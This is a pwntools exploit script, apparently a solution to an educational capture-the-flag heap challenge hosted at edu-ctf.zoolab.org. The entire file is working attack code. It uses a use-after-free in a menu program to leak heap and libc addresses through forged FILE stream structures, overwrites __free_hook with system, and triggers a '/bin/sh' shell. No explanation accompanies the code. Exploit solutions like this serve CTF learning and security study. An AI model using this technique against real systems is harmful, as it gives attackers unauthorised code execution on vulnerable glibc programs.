from pwn import *

context.log_level = 'debug'
context.arch = 'amd64'

def add( idx, username ):
    p.recvuntil("> ")
    p.sendline('1')
    p.recvuntil("index\n> ")
    p.sendline( str( idx ) )
    p.recvuntil("username\n> ")
    p.sendline( username )

def edit( idx, size, data ):
    p.recvuntil("> ")
    p.sendline('2')
    p.recvuntil("index\n> ")
    p.sendline( str( idx ) )
    p.recvuntil("size\n> ")
    p.sendline( str( size ) )
    p.sendline( data )


def delete( idx ):
    p.recvuntil("> ")
    p.sendline('3')
    p.recvuntil("index\n> ")
    p.sendline( str( idx ) )

def show():
    p.recvuntil("> ")
    p.sendline('4')

p = remote( 'edu-ctf.zoolab.org', 10011 )
# p = process('./chal', env={"LD_PRELOAD": "/usr/src/glibc/glibc_dbg/libc.so"})
# p = process('./chal')

add( 0, 'A' * 8 )
edit( 0, 0x18, 'A' * 8 )

add( 1, 'B' * 8 )
edit( 1, 0x18, 'B' * 8 )

add( 2, '/bin/sh\x00' )
edit( 2, 0x18, 'C' * 8 )


delete(0)
delete(1)
show()

p.recvuntil('[1] ')
heapbase = u64( p.recv(6).ljust( 8, b'\x00' ) ) - 0x2a0
info( f"heap base: {hex(heapbase)}" )

flags = 0xfbad0800
read_end = write_base = heapbase + 0x2a0 + 0x30 + 0x68
write_ptr = heapbase + 0x2a0 + 0x30 + 0x68 + 0x6
buf_base = heapbase + 0x2a0 + 0x30 + 0x1e0 + 0x30 + 0x1e0
write_end = 0
fileno = 1
payload = flat(
    flags,      0,
    read_end,   0,
    write_base, write_ptr,
    write_end,  buf_base,
    0,          0,
    0,          0,
    0,          0,
    fileno
)

edit( 2, 0x1d8, payload )
# gdb.attach(p)
# input('>>>')
edit( 1, 0x10, 'B' )
libc = u64( p.recv(6).ljust( 8, b'\x00' ) ) - 0x1ed5c0
info( f"libc: {hex(libc)}" )

free_hook = libc + 0x1eee48
# free_hook = libc + 0x1efb28
info( f"free_hook: {hex(free_hook)}" )
system = libc + 0x52290
# system = libc + 0x78850
info( f"system: {hex(system)}" )

flags = 0xfbad0000
read_end = read_ptr = 0
buf_base = free_hook
buf_end = free_hook + 0x210
fileno = 0
payload = flat(
    flags,    read_ptr,
    read_end, 0,
    0,        0,
    0,        buf_base,
    buf_end,  0,
    0,        0,
    0,        0,
    fileno
)

# input('>>>')
edit( 2, 0x1d8, payload )
show()
sleep(1)
payload = p64( system ).ljust( 0x1ff, b'A' )
# payload = p64( system )
p.sendlineafter( '[0] \ndata: ', payload )
delete(2)
p.interactive()

